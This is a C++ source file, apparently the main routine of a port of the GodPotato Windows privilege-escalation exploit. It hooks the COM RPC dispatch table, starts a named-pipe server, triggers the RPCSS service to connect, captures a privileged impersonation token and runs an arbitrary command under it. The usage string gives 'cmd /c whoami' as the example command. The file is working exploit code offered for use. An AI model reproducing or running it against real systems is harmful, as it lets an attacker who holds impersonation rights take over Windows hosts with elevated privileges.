#include "common.h"
#include "ctx.h"
#include "token.h"
#include "trigger.h"

namespace {

const wchar_t* kUsage =
    L"Usage:\n"
    L"  godpotato_cpp.exe -cmd \"cmd /c whoami\"\n"
    L"  godpotato_cpp.exe cmd /c whoami\n";

std::wstring ParseCommandLine(int argc, wchar_t** argv) {
    for (int i = 1; i < argc; ++i) {
        std::wstring arg = argv[i];
        if (arg == L"-cmd") {
            return (i + 1 < argc) ? argv[i + 1] : std::wstring();
        }
        if (arg.rfind(L"-cmd=", 0) == 0) {
            return arg.substr(5);
        }
    }

    std::wstring command;
    for (int i = 1; i < argc; ++i) {
        if (!command.empty()) command += L' ';
        command += argv[i];
    }
    return command;
}

}  // namespace

int wmain(int argc, wchar_t** argv) {
    std::wstring command = ParseCommandLine(argc, argv);
    if (command.empty() || command == L"-h" || command == L"--help") {
        fputws(kUsage, stdout);
        fflush(stdout);
        return command.empty() ? 1 : 0;
    }

    HRESULT comResult = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(comResult)) {
        gpLog("[!] CoInitializeEx failed: 0x%lx", static_cast<unsigned long>(comResult));
        return 1;
    }

    int exitCode = 0;
    GodPotatoContext context;

    if (!context.Init()) {
        gpLog("[!] GodPotato context not initialized");
        CoUninitialize();
        return 1;
    }

    gpLog("[*] CombaseModule: 0x%llx", static_cast<unsigned long long>(context.combaseModule()));
    gpLog("[*] DispatchTable: 0x%llx", static_cast<unsigned long long>(
                                           reinterpret_cast<uintptr_t>(context.dispatchTable())));
    gpLog("[*] UseProtseqFunction: 0x%llx", static_cast<unsigned long long>(
                                                reinterpret_cast<uintptr_t>(context.originalUseProtseq())));
    gpLog("[*] UseProtseqFunctionParamCount: %lu", static_cast<unsigned long>(context.paramCount()));

    gpLog("[*] HookRPC");
    context.HookRPC();

    gpLog("[*] Start PipeServer");
    if (!context.Start()) {
        gpLog("[!] Cannot start the pipe server");
        context.Restore();
        CoUninitialize();
        return 1;
    }

    gpLog("[*] Trigger RPCSS");
    void* unmarshaled = nullptr;
    int hr = RunTrigger(context, &unmarshaled);
    gpLog("[*] UnmarshalObject: 0x%x", static_cast<unsigned int>(hr));

    HANDLE token = context.WaitToken(10000);
    if (token) {
        std::wstring userName;
        if (TokenUserName(token, userName)) {
            gpLog("[*] CurrentUser: %ls", userName.c_str());
        }
        CreateProcessReadOut(token, command);
        CloseHandle(token);
    } else {
        gpLog("[!] Failed to impersonate security context token");
        exitCode = 1;
    }

    if (unmarshaled) {
        static_cast<IUnknown*>(unmarshaled)->Release();
    }

    context.Restore();
    context.Stop();
    CoUninitialize();
    return exitCode;
}
